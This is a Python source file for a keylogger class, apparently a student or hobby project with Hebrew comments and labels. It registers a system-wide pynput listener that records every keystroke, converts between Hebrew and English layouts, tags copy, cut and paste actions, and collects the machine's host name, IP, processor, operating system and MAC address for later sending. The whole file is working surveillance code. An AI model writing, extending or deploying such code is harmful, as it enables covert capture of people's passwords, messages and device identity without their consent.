from pickle import PickleError

from IKeyLogger import IKeyLogger
from pynput.keyboard import Listener
from getmac import get_mac_address
import socket
import platform
import time
import uuid
import keyboard

class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.data = []
        self.send = None
        self.key_str = ""
        self.listener = None
        self.info = {}
        self.current_language = 'HE'



    def on_press(self, key):
        self.key_str = str(key).replace("'", "")
        self.stop_logging()

        if self.key_str == 'Key.alt_l':
            temp='Key.alt_l'

        else:
            temp=''
        print(temp)
        if temp == 'Key.alt_l' and self.key_str=='Key.shift' or self.key_str=="Key.caps_lock":
            print("בפנים")
            if self.current_language == 'EN':
                self.current_language = 'HE'
                self.key_str = ' [שפה שונתה לעברית] '
                print(" [שפה שונתה לעברית]")
            else:
                self.current_language = 'EN'
                self.key_str = ' [שפה שונתה לאנגלית]'
                print(' [שפה שונתה לאנגלית]')

        if self.current_language == 'HE':
            self.key_str = self.convert_to_hebrew(self.key_str)
            print('HE')

        elif self.current_language == 'EN':
            self.key_str = self.convert_to_english(self.key_str)
            print('EN')

        if self.key_str=='Key.alt_lKey.shift':
            self.key_str=' [שפה שונתה] '
        if self.key_str=='Key.shift':
            self.key_str=' [shift] '
        if self.key_str=="Key.caps_lock":
            self.key_str= " [caps_lock] "
        if self.key_str=='Key.alt_l':
            self.key_str=' [alt_l] '
        if self.key_str == 'Key.space':
            self.key_str = ' '
        if self.key_str == 'Key.enter':
            self.key_str = '\n'
        if self.key_str == 'Key.up':
            self.key_str = ''
        if self.key_str == 'Key.right':
            self.key_str = ' '
        if self.key_str == 'Key.left':
            self.key_str = ''
        if self.key_str == 'Key.down':
            self.key_str = '\n'
        if self.key_str == 'Key.ctrl_l':
            self.key_str = ' [ctrl] '
        if self.key_str == '\\x03':
            self.key_str = ' [copy] '
        if self.key_str == 'Key.backspace':
            self.key_str = ' [backspace] '
        if self.key_str == '\\x18':
            self.key_str = ' [cut] '
        if self.key_str == '\\x16':
            self.key_str = ' [paste] '
        if self.key_str=='<97>':
            self.key_str='1'
        if self.key_str=='<98>':
            self.key_str='2'
        if self.key_str=='<99>':
            self.key_str='3'
        if self.key_str=='<100>':
            self.key_str='4'
        if self.key_str=='<101>':
            self.key_str='5'
        if self.key_str=='<102>':
            self.key_str='6'
        if self.key_str=='<103>':
            self.key_str='7'
        if self.key_str=='<104>':
            self.key_str='8'
        if self.key_str=='<105>':
            self.key_str='9'
        self.data.append(self.key_str)


        
    def start_logging(self) -> None:
        self.listener=Listener(on_press=self.on_press)
        self.listener.start()


    def stop_logging(self) -> None:
        if self.key_str == "@":
            exit()

    def get_logged_keys(self) -> list[str]:
        return self.data




    def convert_to_hebrew(self, char):
          mapping =  {
             't': 'א', 'c': 'ב', 'd': 'ג', 's': 'ד', 'v': 'ה', 'u': 'ו', 'z': 'ז',
             'j': 'ח', 'y': 'ט', 'h': 'י', 'f': 'כ', ';': 'ף', 'k': 'ל', 'n': 'מ',
             'o': 'ם', 'b': 'נ', 'i': 'ן', 'x': 'ס', 'g': 'ע', 'p': 'פ', 'l': 'ך',
             'm': 'צ', '.': 'ץ', 'e': 'ק', 'r': 'ר', 'a': 'ש', ',': 'ת'
         }

          return mapping.get(char.lower(), char)


    def convert_to_english(self, char):
         mapping= {
            'א': 't', 'ב': 'c', 'ג': 'd', 'ד': 's', 'ה': 'v', 'ו': 'u', 'ז': 'z',
            'ח': 'j', 'ט': 'y', 'י': 'h', 'כ': 'f', 'ך': 'l', 'ל': 'k', 'מ': 'n',
            'ם': 'o', 'נ': 'b', 'ן': 'i', 'ס': 'x', 'ע': 'g', 'פ': 'p', 'ף': ';',
            'צ': 'm', 'ץ': '.', 'ק': 'e', 'ר': 'r', 'ש': 'a', 'ת': ','
        }
         return mapping.get(char, char)


    def system_information(self):
        self.info['name'] = socket.gethostname()
        self.info['ip'] = socket.gethostbyname(self.info['name'])
        self.info['cpu'] = platform.processor()
        self.info['os'] = platform.system()
        self.info['type_of_machine'] = platform.machine()
        self.info['mac'] = get_mac_address()

        return self.info







